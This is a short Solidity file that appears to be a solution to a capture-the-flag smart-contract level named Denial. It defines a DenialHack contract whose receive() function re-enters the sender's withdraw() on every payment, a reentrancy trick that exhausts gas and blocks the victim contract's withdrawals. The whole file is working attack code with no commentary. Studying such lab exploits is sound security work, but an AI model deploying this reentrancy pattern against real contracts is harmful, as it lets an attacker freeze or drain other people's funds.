pragma solidity ^0.6.0;

import './Denial.sol';

contract DenialHack {

    receive() external payable {
        address(Denial(msg.sender)).call(abi.encodeWithSignature("withdraw()"));
    }
}
